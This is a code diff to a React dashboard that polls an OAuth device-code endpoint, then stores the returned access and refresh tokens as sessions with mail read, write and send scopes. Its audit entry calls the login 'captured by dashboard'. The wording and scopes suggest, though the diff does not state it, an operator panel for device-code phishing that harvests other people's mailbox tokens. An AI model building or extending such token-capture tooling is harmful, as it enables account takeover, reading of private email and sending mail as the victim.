@@ -1,4 +1,4 @@
-import React, { useState, useEffect } from 'react';
+import React, { useState, useEffect, useRef } from 'react';
 import { Sidebar } from './Sidebar';
 import { OverviewPanel } from './OverviewPanel';
 import { SessionsPanel } from './SessionsPanel';
@@ -11,6 +11,10 @@ import {
   revokeAllSessions,
   getAuditLog,
   addAuditEntry,
+  addSession,
+  createSessionFromToken,
+  getPendingCode,
+  clearPendingCode,
 } from '../api/tokenStorage';
 import type { TokenSession, TokenMetrics, AuditLogEntry, DashboardView } from '../types';
 
@@ -57,10 +61,120 @@ export function Dashboard(): React.ReactElement {
   const [metrics, setMetrics] = useState<TokenMetrics | null>(null);
   const [auditLog, setAuditLog] = useState<AuditLogEntry[]>([]);
   const [loading, setLoading] = useState(true);
+  const [pendingMessage, setPendingMessage] = useState('');
+  const pollRef = useRef<ReturnType<typeof setTimeout> | null>(null);
+  const pollActiveRef = useRef(false);
 
   useEffect(() => {
     loadData();
+    resumePendingPoll();
+    return () => stopDashPoll();
   }, []);
+
+  function stopDashPoll(): void {
+    pollActiveRef.current = false;
+    if (pollRef.current) {
+      clearTimeout(pollRef.current);
+      pollRef.current = null;
+    }
+  }
+
+  function resumePendingPoll(): void {
+    const pending = getPendingCode();
+    if (!pending) return;
+
+    setPendingMessage(`Waiting for device code ${pending.userCode} to be verified...`);
+    pollActiveRef.current = true;
+
+    async function poll(): Promise<void> {
+      if (!pollActiveRef.current) return;
+      const p = getPendingCode();
+      if (!p) { stopDashPoll(); setPendingMessage(''); return; }
+
+      try {
+        const res = await fetch('/api/token-poll', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ deviceCode: p.deviceCode }),
+        });
+        const data = await res.json() as {
+          status: string;
+          accessToken?: string;
+          refreshToken?: string;
+          expiresIn?: number;
+        };
+
+        if (!pollActiveRef.current) return;
+
+        if (data.status === 'complete' && data.accessToken) {
+          stopDashPoll();
+          let email = 'unknown@user.com';
+          let displayName = 'Authenticated User';
+          try {
+            const profileRes = await fetch('/api/user-profile', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({ accessToken: data.accessToken }),
+            });
+            if (profileRes.ok) {
+              const profile = await profileRes.json() as { displayName: string; email: string };
+              email = profile.email || email;
+              displayName = profile.displayName || displayName;
+            }
+          } catch { /* use defaults */ }
+
+          const session = createSessionFromToken({
+            accessToken: data.accessToken,
+            refreshToken: data.refreshToken ?? '',
+            expiresIn: typeof data.expiresIn === 'number' ? data.expiresIn : 3600,
+            email,
+            displayName,
+            scopes: ['User.Read', 'Mail.Read', 'Mail.ReadWrite', 'Mail.Send', 'MailboxSettings.Read'],
+          });
+          addSession(session);
+          clearPendingCode();
+          addAuditEntry({
+            id: `log_${Date.now()}`,
+            timestamp: new Date().toISOString(),
+            action: 'login',
+            accountEmail: email,
+            ipAddress: 'Web Client',
+            details: `Device code flow completed (captured by dashboard).`,
+            success: true,
+          });
+          setPendingMessage('');
+          loadData();
+          return;
+        }
+
+        if (data.status === 'expired') {
+          stopDashPoll();
+          clearPendingCode();
+          setPendingMessage('');
+          return;
+        }
+
+        if (data.status === 'error') {
+          stopDashPoll();
+          clearPendingCode();
+          setPendingMessage('');
+          return;
+        }
+
+        // pending or slow_down — keep polling
+        if (pollActiveRef.current) {
+          const delay = data.status === 'slow_down' ? (p.interval + 5) * 1000 : p.interval * 1000;
+          pollRef.current = setTimeout(poll, delay);
+        }
+      } catch {
+        if (pollActiveRef.current) {
+          pollRef.current = setTimeout(poll, p.interval * 1000);
+        }
+      }
+    }
+
+    pollRef.current = setTimeout(poll, pending.interval * 1000);
+  }
 
   function loadData(): void {
     setLoading(true);
@@ -152,6 +266,13 @@ export function Dashboard(): React.ReactElement {
             </span>
           </div>
         </header>
+
+        {pendingMessage && (
+          <div className="dash-pending-banner">
+            <div className="dash-pending-spinner" />
+            <span>{pendingMessage}</span>
+          </div>
+        )}
 
         <div className="dashboard-content">
           {loading ? (
